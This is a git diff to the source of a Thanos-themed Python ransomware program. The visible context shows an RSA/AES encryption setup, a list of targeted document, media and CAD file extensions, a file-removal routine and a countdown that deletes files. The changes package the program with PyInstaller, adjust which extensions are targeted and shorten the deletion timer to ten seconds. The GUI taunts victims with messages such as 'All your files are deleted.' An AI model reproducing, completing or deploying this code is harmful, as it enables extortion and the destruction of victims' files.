@@ -5,6 +5,7 @@ from Crypto.PublicKey import RSA
 from Crypto import Random
 from Crypto.Cipher import PKCS1_OAEP
 import os
+import sys
 import random
 import threading
 from time import sleep
@@ -23,7 +24,7 @@ iv = os.urandom(16)
 UUID = uuid.getnode()
 extlist = \
     ['doc', 'docx', 'txt', 'hwp', 'ppt', 'pptx', 'xlsx', 'xls', 'pdf',
-     'jpg', 'jpeg', 'png', 'gif',
+     #'jpg', 'jpeg', 'png', 'gif',
      'mp3', 'wav', 'wma',
      'psd', 'pdd', 'ai', 'dwg', 'dxf', '3dm']
 
@@ -82,7 +83,7 @@ def dec(cipher, in_filename, out_filename=None):
 
 def removeFiles(gui, remove_filelist):  # ext 안쓰더라 지워버림
     gui.l_thanos.destroy()
-    gui.l_thanos = AnimatedGIF(gui.window, "../ui/thanos1.gif")
+    gui.l_thanos = AnimatedGIF(gui.window, resource_path("ui/thanos1.gif"))
     gui.l_thanos.pack()
 
     sleep(2)
@@ -105,6 +106,13 @@ def removeFiles(gui, remove_filelist):  # ext 안쓰더라 지워버림
     gui.listWindow.destroy()
 
     startTimer(gui, os.getcwd())  # @@
+
+def resource_path(relative_path):
+    print(getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__))))
+    """ Get absolute path to resource, works for dev and for PyInstaller """
+    base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
+    print(os.path.join(base_path, relative_path))
+    return (os.path.join(base_path, relative_path))
 
 class AnimatedGIF(Label, object):
     def __init__(self, master, path, forever=True):
@@ -243,7 +251,7 @@ class MyTk:
         self.pwbutton = tkinter.Button(self.window, text="Decode", command=self.keySubmit, disabledforeground='green')
         self.pwbutton.pack()
 
-        self.thanos = tkinter.PhotoImage(file="../ui/face.png")
+        self.thanos = tkinter.PhotoImage(file=resource_path("ui/face.png"))
         self.l_thanos = tkinter.Label(self.window, image=self.thanos, borderwidth=0, compound="center",
                                       highlightthickness=0)
         self.l_thanos.pack()
@@ -273,7 +281,7 @@ class MyTk:
 
         self.l_text.config(text="\nYour files have been decrypted! Thank you, idiot.\n\n", font='Helvetica 16 bold')
 
-        self.final_image = tkinter.PhotoImage(file="../ui/final_thanos.png")
+        self.final_image = tkinter.PhotoImage(file=resource_path("ui/final_thanos.png"))
         self.l_final = tkinter.Label(self.window, image=self.final_image, padx=10, pady=50)
         self.l_final.pack()
         #sleep(5)
@@ -289,7 +297,7 @@ class MyTk:
         self.pwbutton.destroy()
         self.l_thanos.destroy()
 
-        self.l_text.config(text="\n\n\n\nYour files are all deleted.\n\n", fg="red",
+        self.l_text.config(text="\n\n\n\nAll your files are deleted.\n\n", fg="red",
                            font='Helvetica 50 bold')
 
         sleep(5)
@@ -333,7 +341,7 @@ def startTimer(gui, path, ext=None):
     gui.listWindow.lift()
     gui.list.pack()
 
-    clock(gui, 300, antdd_filelist)
+    clock(gui, 10, antdd_filelist)
 
 
 def clock(gui, sec, antdd_filelist):
